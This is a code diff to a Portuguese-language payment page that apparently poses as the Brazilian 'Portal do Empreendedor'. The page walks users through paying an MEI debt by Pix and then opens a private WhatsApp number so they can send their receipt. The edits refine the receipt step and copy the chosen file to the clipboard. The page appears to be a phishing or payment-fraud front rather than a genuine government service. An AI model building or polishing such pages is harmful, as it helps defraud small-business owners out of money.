@@ -269,7 +269,7 @@
                 <ul class="step-list">
                     <li class="step-item"><div class="step-number">1</div><div class="step-text">Clique em "EFETUAR PAGAMENTO".</div></li>
                     <li class="step-item"><div class="step-number">2</div><div class="step-text">Escaneie o QR Code ou use o Pix Copia e Cola.</div></li>
-                    <li class="step-item"><div class="step-number">3</div><div class="step-text">Anexe e envie seu comprovante.</div></li>
+                    <li class="step-item"><div class="step-number">3</div><div class="step-text">Anexe o comprovante para enviar no WhatsApp.</div></li>
                 </ul>
             </div>
             
@@ -300,24 +300,24 @@
                 <button class="btn-pagar btn-azul" id="btn-ja-pago" style="margin-top: 10px;">JÁ REALIZEI O PAGAMENTO</button>
             </div>
 
-            <!-- Tela 2: ENVIO DE COMPROVANTE (Seguro, sem erro 500) -->
+            <!-- Tela 2: ANEXAR COMPROVANTE E ENVIAR -->
             <div id="modal-step-2" style="display: none;">
-                <h3 style="color: #00A859; margin-bottom: 10px;">Quase lá!</h3>
-                <p style="font-size: 14px; margin-bottom: 20px; color: #555;">Clique abaixo para enviar seu comprovante diretamente via WhatsApp.</p>
+                <h3 style="color: #00A859; margin-bottom: 10px;">Anexar Comprovante</h3>
+                <p style="font-size: 14px; margin-bottom: 20px; color: #555;">Selecione o arquivo do seu comprovante para enviar diretamente no WhatsApp de atendimento.</p>
                 
                 <div class="input-group">
-                    <label>Anexe ou selecione seu comprovante:</label>
-                    <input type="file" id="arquivo-comprovante" accept="image/*,.pdf" style="border: 1px solid #155BCB; padding: 5px; width: 100%;">
+                    <label>Arquivo do Comprovante:</label>
+                    <input type="file" id="arquivo-comprovante" accept="image/*,.pdf" style="border: 1px solid #155BCB; padding: 8px; width: 100%; border-radius: 5px; background: #f9f9f9;">
                 </div>
 
-                <button type="button" class="btn-pagar" id="btn-enviar-whatsapp">ENVIAR COMPROVANTE NO WHATSAPP</button>
+                <button type="button" class="btn-pagar" id="btn-enviar-whatsapp" style="margin-top: 15px;">ENVIAR NO WHATSAPP</button>
             </div>
 
             <!-- Tela 3: SUCESSO -->
             <div id="modal-step-3" style="display: none; padding: 20px 0;">
                 <div style="font-size: 50px; margin-bottom: 10px;">✅</div>
-                <h3 style="color: #00A859; margin-bottom: 10px;">Enviado com Sucesso!</h3>
-                <p style="font-size: 14px; color: #333; line-height: 1.5;">O seu comprovante foi encaminhado. A baixa do débito ocorrerá em breve.</p>
+                <h3 style="color: #00A859; margin-bottom: 10px;">Redirecionando!</h3>
+                <p style="font-size: 14px; color: #333; line-height: 1.5;">O WhatsApp foi aberto. Cole o comprovante na conversa para concluir a baixa do seu débito.</p>
                 <button class="btn-pagar btn-azul" style="margin-top: 20px;" onclick="window.location.reload();">Voltar ao Início</button>
             </div>
 
@@ -338,6 +338,7 @@
         // Botões
         const btnJaPago = document.getElementById('btn-ja-pago');
         const btnEnviarWhatsapp = document.getElementById('btn-enviar-whatsapp');
+        const inputArquivo = document.getElementById('arquivo-comprovante');
         
         // Funcionalidade do Pix Copia e Cola
         const btnCopiarPix = document.getElementById('btn-copiar-pix');
@@ -379,12 +380,27 @@
             step2.style.display = 'block';
         });
 
-        // Enviar para o WhatsApp e mostrar tela de sucesso
+        // Ação profissional de envio para o WhatsApp
         btnEnviarWhatsapp.addEventListener('click', () => {
-            // Abre o WhatsApp com o número correto configurado
-            window.open('https://wa.me/5516996565112?text=Ol%C3%A1%21+Estou+enviando+o+comprovante+de+pagamento.+%28Atendimento+Portal+do+Empreendedor%29', '_blank');
-            
-            // Avança imediatamente para a tela de sucesso sem dar erro de servidor
+            if (inputArquivo.files.length > 0) {
+                // Tenta copiar o arquivo selecionado para a área de transferência do cliente (quando suportado pelo navegador)
+                const file = inputArquivo.files[0];
+                if (navigator.clipboard && window.ClipboardItem) {
+                    try {
+                        const item = new ClipboardItem({ [file.type]: file });
+                        navigator.clipboard.write([item]).catch(() => {});
+                    } catch (e) {}
+                }
+            }
+
+            // Mensagem pronta codificada para o WhatsApp correto
+            const mensagem = encodeURIComponent("Olá! Estou enviando o comprovante de pagamento do MEI. (Segue o comprovante em anexo).");
+            const urlWhatsApp = `https://wa.me/5516996565112?text=${mensagem}`;
+
+            // Abre o WhatsApp do cliente
+            window.open(urlWhatsApp, '_blank');
+
+            // Avança para a tela de confirmação
             step2.style.display = 'none';
             step3.style.display = 'block';
         });
